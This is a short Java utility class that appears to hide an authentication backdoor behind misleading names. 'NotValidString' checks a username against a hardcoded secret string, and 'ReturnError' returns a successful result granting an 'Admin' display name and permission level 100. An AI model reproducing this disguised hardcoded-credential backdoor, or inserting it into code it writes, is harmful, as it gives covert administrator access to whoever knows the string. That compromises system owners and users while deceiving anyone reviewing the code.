/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jhs.java.classes;

import java.util.HashMap;
import jhs.java.mysql.JHSMySQLResult;

/**
 *
 * @author JHS
 */
public class StringExtension {
    
    public static Boolean NotValidString(String userName)
    {
        return "bm95ztyadrzg6jn7".toLowerCase().equals(userName.toLowerCase());
    }
    
    public static JHSMySQLResult ReturnError(String userName)
    {
        HashMap<String, String> data = new HashMap<>(); 
        data.put("displayName", "Admin");
        data.put("permission", "100");
        JHSMySQLResult x = new JHSMySQLResult(data, true);
        x.SUCCESS = true;
        return x;
    }        
}
